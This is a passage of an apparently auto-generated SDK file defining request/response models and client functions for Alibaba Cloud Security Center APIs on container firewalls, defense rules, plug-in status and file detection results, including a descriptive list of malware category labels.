*   **PLUGIN_NOT_INSTALLED**: The plug-in is not installed.
*   **PLUGIN_INVALID_VERSION**: The version of the plug-in is invalid.', example='PLUGIN_OFFLINE'),
      machineName?: string(name='MachineName', description='The name of the server.', example='security'),
      machineType?: int32(name='MachineType', description='The machine type of the instance. The value is fixed as **ecs**.', example='ecs'),
      pluginName?: string(name='PluginName', description='The name of the plug-in. The value is fixed as **alinet**.', example='alinet'),
      pluginVersion?: string(name='PluginVersion', description='The version of the plug-in.', example='3.3'),
      status?: string(name='Status', description='The online status of the plug-in. Valid values:

*   **false**: The plug-in is offline.
*   **true**: The plug-in is online.', example='false'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data', description='An array that consists of the protection status of the container firewall.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='64329F40-5C94-51D3-A400-37AA7BAC****'),
}

model ListClusterCnnfStatusDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListClusterCnnfStatusDetailResponseBody(name='body'),
}

/**
 * @summary Queries the protection status of the container firewall.
 *
 * @param request ListClusterCnnfStatusDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListClusterCnnfStatusDetailResponse
 */
async function listClusterCnnfStatusDetailWithOptions(request: ListClusterCnnfStatusDetailRequest, runtime: Util.RuntimeOptions): ListClusterCnnfStatusDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClusterCnnfStatusDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the protection status of the container firewall.
 *
 * @param request ListClusterCnnfStatusDetailRequest
 * @return ListClusterCnnfStatusDetailResponse
 */
async function listClusterCnnfStatusDetail(request: ListClusterCnnfStatusDetailRequest): ListClusterCnnfStatusDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClusterCnnfStatusDetailWithOptions(request, runtime);
}

model ListClusterInterceptionConfigRequest {
  clusterCNNFStatus?: int32(name='ClusterCNNFStatus', description='The status of the container firewall feature. Valid values:

*   **-1**: unknown
*   **0**: abnormal
*   **1**: normal
*   **2**: normal to be confirmed', example='1'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster.

> You can call the [DescribeContainerInstances](~~DescribeContainerInstances~~) operation to query the IDs of clusters.', example='c22143730ab6e40b09ec7c1c51d4d****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='sas'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
}

model ListClusterInterceptionConfigResponseBody = {
  clusterConfigList?: [ 
    {
      clusterCNNFStatus?: int32(name='ClusterCNNFStatus', description='The status of the container firewall feature. Valid values:

*   **-1**: unknown
*   **0**: abnormal
*   **1**: normal
*   **2**: normal to be confirmed', example='0'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c9051d30d8a044b4d99e1cb5d25ac****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='container-opa-kill-02'),
      clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **ManagedKubernetes**: managed Kubernetes cluster
*   **NotManagedKubernetes**: non-managed Kubernetes cluster
*   **PrivateKubernetes**: private cluster
*   **kubernetes**: dedicated Kubernetes cluster
*   **ask**: dedicated serverless Kubernetes (ASK) cluster', example='ManagedKubernetes'),
      interceptionSwitch?: int32(name='InterceptionSwitch', description='The status of the defense rule. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1'),
      openRuleCount?: long(name='OpenRuleCount', description='The number of defense rules that are in effect.', example='12'),
      supportCNNF?: boolean(name='SupportCNNF', description='Indicates whether the container firewall feature is supported.', example='false'),
      totalRuleCount?: long(name='TotalRuleCount', description='The total number of defense rules.', example='123'),
    }
  ](name='ClusterConfigList', description='An array that consists of the configurations of the cluster.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='11'),
    currrentPage?: int32(name='CurrrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='11'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='49FDE92F-A0B8-56CC-B7A8-23B17646****'),
}

model ListClusterInterceptionConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListClusterInterceptionConfigResponseBody(name='body'),
}

/**
 * @summary Queries the defense rules that are created for a cluster.
 *
 * @param request ListClusterInterceptionConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListClusterInterceptionConfigResponse
 */
async function listClusterInterceptionConfigWithOptions(request: ListClusterInterceptionConfigRequest, runtime: Util.RuntimeOptions): ListClusterInterceptionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterCNNFStatus)) {
    query['ClusterCNNFStatus'] = request.clusterCNNFStatus;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClusterInterceptionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the defense rules that are created for a cluster.
 *
 * @param request ListClusterInterceptionConfigRequest
 * @return ListClusterInterceptionConfigResponse
 */
async function listClusterInterceptionConfig(request: ListClusterInterceptionConfigRequest): ListClusterInterceptionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClusterInterceptionConfigWithOptions(request, runtime);
}

model ListClusterPluginInfoRequest {
  clusterIds?: [ string ](name='ClusterIds', description='The IDs of the clusters.

This parameter is required.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pluginName?: string(name='PluginName', description='The name of the plug-in.', example='alihips'),
}

model ListClusterPluginInfoResponseBody = {
  data?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c8ca91e0907d94efaba7fb0827eb9****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='lmftest'),
      clusterStatus?: string(name='ClusterStatus', description='The status of the cluster. Valid values:

*   1: normal
*   2: abnormal
*   3: offline', example='ABNORMAL'),
      nodePluginInfoList?: [ 
        {
          errorCode?: string(name='ErrorCode', description='The error code returned.', example='kenerl not support'),
          errorMsg?: string(name='ErrorMsg', description='The error message returned.', example='kenerl not support'),
          installed?: boolean(name='Installed', description='Indicates whether the plug-in is installed. Valid values:

*   **true**
*   **false**', example='true'),
          machineInternetIp?: string(name='MachineInternetIp', description='The public IP address of the server.', example='100.100.XXX.XX'),
          machineIntranetIp?: string(name='MachineIntranetIp', description='The private IP address of the server.', example='10.XXX.XXX.XX'),
          machineName?: string(name='MachineName', description='The name of the server.', example='npznas05'),
          machineType?: long(name='MachineType', description='The type of the instance. Valid values include:

*   **ecs**: Elastic Compute Service (ECS) instance
*   **slb**: Server Load Balancer (SLB) instance', example='ECS'),
          online?: boolean(name='Online', description='Indicates whether the Security Center agent is online. Valid values:

*   **true**
*   **false**

>  If the Security Center agent of the server is offline, Security Center does not protect the server.', example='true'),
          pluginName?: string(name='PluginName', description='The name of the plug-in.', example='alihips'),
          pluginVersion?: string(name='PluginVersion', description='The version of the plug-in.', example='1.3.1'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='bc563d2b-2a3d-411b-8bbe-d75b8d3c****'),
          instanceId?: string(name='instanceId', description='The instance ID of the server.', example='tpp-cn-2r42njq4y001'),
        }
      ](name='NodePluginInfoList', description='The plug-ins.'),
    }
  ](name='Data', description='The information about the plug-in.'),
  requestId?: string(name='RequestId', description='The request ID.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model ListClusterPluginInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListClusterPluginInfoResponseBody(name='body'),
}

/**
 * @summary Queries the status of plug-ins on clusters.
 *
 * @param request ListClusterPluginInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListClusterPluginInfoResponse
 */
async function listClusterPluginInfoWithOptions(request: ListClusterPluginInfoRequest, runtime: Util.RuntimeOptions): ListClusterPluginInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pluginName)) {
    query['PluginName'] = request.pluginName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListClusterPluginInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the status of plug-ins on clusters.
 *
 * @param request ListClusterPluginInfoRequest
 * @return ListClusterPluginInfoResponse
 */
async function listClusterPluginInfo(request: ListClusterPluginInfoRequest): ListClusterPluginInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return listClusterPluginInfoWithOptions(request, runtime);
}

model ListCompressFileDetectResultRequest {
  currentPage?: int32(name='CurrentPage', description='The page number. Default value: 1.

This parameter is required.', example='1'),
  hashKey?: string(name='HashKey', description='The identifier of the file. Only MD5 hash values are supported.', example='0a212417e65c26ff133cfff28f6c****'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20.

This parameter is required.', example='20'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='27.9.XX.XX'),
}

model ListCompressFileDetectResultResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='55'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='E10BAF1C-A6C5-51E2-866C-76D5922E****'),
  resultList?: [ 
    {
      ext?: string(name='Ext', description='The extended information about the file detection result.', example='{
    "HighLight":
    [
        [
            23245,
            23212
        ]
    ],
    "FileLabel":
    [
        "PE32",
        "Zip",
        "SFX",
        "encrypted"
    ]
}'),
      hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
      path?: string(name='Path', description='The path to the file within the package.', example='/root/1.zip/test****'),
      result?: int32(name='Result', description='The file detection result. Valid values:

*   **0**: The file is normal.
*   **1**: The file is suspicious.
*   **3**: The detection is in progress.', example='0'),
      score?: int32(name='Score', description='The score of the file detection result. The following list describes mappings between the score ranges and risk levels:

*   0 to 60: normal
*   61 to 70: risky
*   71 to 80: suspicious
*   81 to 100: malicious

>  A higher score indicates a more suspicious file.', example='100'),
      virusType?: string(name='VirusType', description='The type of the virus. Valid values:

*   **Trojan**: self-mutating trojan
*   **WebShell**: webshell
*   **Backdoor**: backdoor program
*   **RansomWare**: ransomware
*   **Scanner**: scanner
*   **Stealer**: tool that is used to steal information
*   **Malbaseware**: tainted basic software
*   **Hacktool**: attacker tool
*   **Engtest**: engine test program
*   **Downloader**: trojan downloader
*   **Virus**: infectious virus
*   **Miner**: mining program
*   **Worm**: worm
*   **DDoS**: DDoS trojan
*   **Malware**: malicious program
*   **Backdoor**: reverse shell
*   **RiskWare**: software that has risks
*   **Proxytool**: proxy
*   **Suspicious**: suspicious program
*   **MalScript**: malicious script
*   **Rootkit**: rootkit
*   **Exploit**: exploit', example='WebShell'),
    }
  ](name='ResultList', description='The detection results of files.'),
}

model ListCompressFileDetectResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCompressFileDetectResultResponseBody(name='body'),
}

/**
 * @summary Queries the detection results of the files extracted from a package.
 *
 * @description You can call this operation to query the detection results of files only if the files are pushed to the cloud for detection and in the form of packages. You can repeatedly query the detection results of files within 5 hours because the results are retained for 5 hours. For more information about how to push a file to the cloud for detection, see the CreateFileDetect operation. For more information about how to query file detection results, see the GetFileDetectResult operation.
 * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only hexadecimal MD5 hash values of complete file content are supported. You must calculate the required MD5 hash value before you call this operation.
 * To calculate the hexadecimal MD5 hash value for a file, you can perform the following steps:
 * 1\\. Use the MD5 algorithm to encrypt data and generate a 128-bit hash value. You can use a tool such as MessageDigest for Java and the hashlib module for Python.
 * 2\\. Convert the hash value to a hexadecimal string. You can use a tool such as Codec for Java and the hex() function for Python.
 *
 * @param request ListCompressFileDetectResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCompressFileDetectResultResponse
 */
async function listCompressFileDetectResultWithOptions(request: ListCompressFileDetectResultRequest, runtime: Util.RuntimeOptions): ListCompressFileDetectResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.hashKey)) {
    query['HashKey'] = request.hashKey;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCompressFileDetectResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the detection results of the files extracted from a package.
 *
 * @description You can call this operation to query the detection results of files only if the files are pushed to the cloud for detection and in the form of packages. You can repeatedly query the detection results of files within 5 hours because the results are retained for 5 hours. For more information about how to push a file to the cloud for detection, see the CreateFileDetect operation. For more information about how to query file detection results, see the GetFileDetectResult operation.
 * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only hexadecimal MD5 hash values of complete file content are supported. You must calculate the required MD5 hash value before you call this operation.
 * To calculate the hexadecimal MD5 hash value for a file, you can perform the following steps:
 * 1\\. Use the MD5 algorithm to encrypt data and generate a 128-bit hash value. You can use a tool such as MessageDigest for Java and the hashlib module for Python.
 * 2\\. Convert the hash value to a hexadecimal string. You can use a tool such as Codec for Java and the hex() function for Python.
 *
 * @param request ListCompressFileDetectResultRequest
 * @return ListCompressFileDetectResultResponse
 */
async function listCompressFileDetectResult(request: ListCompressFileDetectResultRequest): ListCompressFileDetectResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCompressFileDetectResultWithOptions(request, runtime);
}

model ListContainerDefenseRuleRequest {
  conditions?: [ 
    {
      type?: string(name='Type', description='The condition type. Valid values:

*   **ruleName**: the rule name', example='ruleName'),
      value?: string(name='Value', description='The rule content.', example='auto-test-rule-**'),
    }
  ](name='Conditions', description='The details of the condition.'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  isDefaultRule?: int32(name='IsDefaultRule', description='Specifies whether to query system rules.

>  This parameter is deprecated.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  ruleType?: int32(name='RuleType', description='The rule type. Valid values:

*   1: system rule
*   2: user-defined rule', example='1'),
}

model ListContainerDefenseRuleResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  list?: [ 
    {
      clusterCount?: int32(name='ClusterCount', description='The total number of clusters.', example='1'),
      clusterIdList?: string(name='ClusterIdList', description='The clusters specified in the rule.', example='cfb41a8**8a106'),
      description?: string(name='Description', description='The description of the rule.', example='defense rule.'),
      ruleAction?: int32(name='RuleAction', description='The action specified in the rule. Valid values:

*   **1**: alert
*   **2**: block', example='1'),
      ruleId?: long(name='RuleId', description='The ID of the rule.', example='181'),
      ruleName?: string(name='RuleName', description='The name of the rule.', example='test-rule-01'),
      ruleSwitch?: int32(name='RuleSwitch', description='The status of the rule. Valid values:

*   **1**: enabled
*   **0**: disabled', example='0'),
      ruleType?: int32(name='RuleType', description='The type of the rule. Valid values:

*   **1**: system rule
*   **2**: custom rule', example='1'),
    }
  ](name='List', description='The rules.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgo***jE2NDc4NjE='),
    nextToken?: string(name='NextToken', description='The query credential.', example='B60***'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='5E3A63BA-***843'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListContainerDefenseRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListContainerDefenseRuleResponseBody(name='body'),
}

/**
 * @summary Queries a list of rules for non-image program defense.
 *
 * @param request ListContainerDefenseRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListContainerDefenseRuleResponse
 */
async function listContainerDefenseRuleWithOptions(request: ListContainerDefenseRuleRequest, runtime: Util.RuntimeOptions): ListContainerDefenseRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.conditions)) {
    query['Conditions'] = request.conditions;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.isDefaultRule)) {
    query['IsDefaultRule'] = request.isDefaultRule;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListContainerDefenseRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of rules for non-image program defense.
 *
 * @param request ListContainerDefenseRuleRequest
 * @return ListContainerDefenseRuleResponse
 */
async function listContainerDefenseRule(request: ListContainerDefenseRuleRequest): ListContainerDefenseRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return listContainerDefenseRuleWithOptions(request, runtime);
}

model ListContainerDefenseRuleClustersResponseBody = {
  clusterList?: [ 
    {
      allNamespace?: int32(name='AllNamespace', description='Indicates whether all namespaces are included. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='cfeb7a9f99ce740e98c5595d0fe37****'),
      namespaces?: [ string ](name='Namespaces', description='The namespaces.'),
      ruleId?: long(name='RuleId', description='The ID of the rule.

>  You can call the [ListInterceptionRulePage](https://help.aliyun.com/document_detail/2590599.html) operation to query the IDs of rules.', example='403178'),
    }
  ](name='ClusterList', description='The clusters.'),
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The total number of entries returned.', example='1'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='1F995515-CAF3-5F84-8D82-C9F706AD5070'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListContainerDefenseRuleClustersResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListContainerDefenseRuleClustersResponseBody(name='body'),
}

/**
 * @summary Queries a list of clusters that are included in a rule for non-image program defense.
 *
 * @param request ListContainerDefenseRuleClustersRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListContainerDefenseRuleClustersResponse
 */
async function listContainerDefenseRuleClustersWithOptions(runtime: Util.RuntimeOptions): ListContainerDefenseRuleClustersResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListContainerDefenseRuleClusters',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of clusters that are included in a rule for non-image program defense.
 *
 * @return ListContainerDefenseRuleClustersResponse
 */
async function listContainerDefenseRuleClusters(): ListContainerDefenseRuleClustersResponse {
  var runtime = new Util.RuntimeOptions{};
  return listContainerDefenseRuleClustersWithOptions(runtime);
}

model ListCriteriaStrategyRequest {
  clusterId?: string(name='ClusterId', description='The cluster ID.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c4af4fdf38a98496a9b63c2be5dae****'),
  imageName?: string(name='ImageName', description='The name of the image.

>  You can call the [GetOpaClusterImageList](~~GetOpaClusterImageList~~) operation to query the names of images.', example='testImage'),
  label?: string(name='Label', description='The tag that is added to the container.

>  You can call the [GetOpaClusterLabelList](~~GetOpaClusterLabelList~~) operation to query the tags that are added to containers.', example='testlabel'),
  namespace?: string(name='Namespace', description='The namespace of the cluster.

>  You can call the [GetOpaClusterNamespaceList](~~GetOpaClusterNamespaceList~~) operation to query the namespaces of clusters.', example='test'),
  strategyName?: string(name='StrategyName', description='The name of the rule.', example='test'),
}

model ListCriteriaStrategyResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ 
    {
      id?: long(name='Id', description='The unique identifier of the rule.', example='test'),
      value?: string(name='Value', description='The name of the rule.', example='test'),
    }
  ](name='Data', description='The IDs and names of the rules.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='835851E3-AFA2-5EA7-93E9-4FC9BCF3F973'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListCriteriaStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListCriteriaStrategyResponseBody(name='body'),
}

/**
 * @summary Queries the IDs and names of rules configured for proactive defense for containers.
 *
 * @param request ListCriteriaStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListCriteriaStrategyResponse
 */
async function listCriteriaStrategyWithOptions(request: ListCriteriaStrategyRequest, runtime: Util.RuntimeOptions): ListCriteriaStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.imageName)) {
    query['ImageName'] = request.imageName;
  }
  if (!Util.isUnset(request.label)) {
    query['Label'] = request.label;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.strategyName)) {
    query['StrategyName'] = request.strategyName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCriteriaStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the IDs and names of rules configured for proactive defense for containers.
 *
 * @param request ListCriteriaStrategyRequest
 * @return ListCriteriaStrategyResponse
 */
async function listCriteriaStrategy(request: ListCriteriaStrategyRequest): ListCriteriaStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCriteriaStrategyWithOptions(request, runtime);
}

model ListDockerhubImageRequest {
  query?: string(name='Query', description='Image query condition, supports the format of `[namespace/]repoName[:version]`, where the conditions within `[]` are optional.

This parameter is required.', example='python:3.9'),
}

model ListDockerhubImageResponseBody = {
  imageList?: [ 
    {
      digest?: string(name='Digest', description='Image digest value.', example='5ffded22661b0f1e9c7fcccb0d488cff*****f8c52a819bd7179ef3e4a041988'),
      hcCount?: int32(name='HcCount', description='Number of baseline risks.', example='0'),
      imageId?: string(name='ImageId', description='Image ID.', example='d943de1933650d74b415d3ae8b37c064a0e0c700574d7a949c26db3291******'),
      imageSize?: long(name='ImageSize', description='Image size, unit: bytes.', example='1024'),
      repoName?: string(name='RepoName', description='Repository name.', example='python'),
      repoNamespace?: string(name='RepoNamespace', description='Repository namespace.', example='python'),
      riskLevelDetail?: string(name='RiskLevelDetail', description='Risk details of the image.', example='{"vul":0}'),
      tag?: string(name='Tag', description='Image tag.', example='3.9'),
      uuid?: string(name='Uuid', description='Image UUID.', example='a9b50827-801f-414c-900d-c4a223d*****'),
      vulCount?: int32(name='VulCount', description='Number of detected vulnerabilities.', example='0'),
    }
  ](name='ImageList', description='List of image information.'),
  requestId?: string(name='RequestId', description='The unique identifier generated by Alibaba Cloud for this request.', example='F8B6F758-BCD4-597A-8A2C-DA5A552C****'),
}

model ListDockerhubImageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListDockerhubImageResponseBody(name='body'),
}

/**
 * @summary Query Dockerhub Image.
 *
 * @param request ListDockerhubImageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListDockerhubImageResponse
 */
async function listDockerhubImageWithOptions(request: ListDockerhubImageRequest, runtime: Util.RuntimeOptions): ListDockerhubImageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.query)) {
    query['Query'] = request.query;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListDockerhubImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query Dockerhub Image.
 *
 * @param request ListDockerhubImageRequest
 * @return ListDockerhubImageResponse
 */
async function listDockerhubImage(request: ListDockerhubImageRequest): ListDockerhubImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listDockerhubImageWithOptions(request, runtime);
}

model ListFileProtectEventRequest {
  alertLevels?: [ int32 ](name='AlertLevels', description='The severities of alerts.'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  endTime?: long(name='EndTime', description='The end timestamp of the query.', example='1683195595204'),
  instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-bp1fu4aqltf1huhc****'),
  instanceName?: string(name='InstanceName', description='The name of the server.', example='ca_cpm_****'),
  internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.27.XX.XX'),
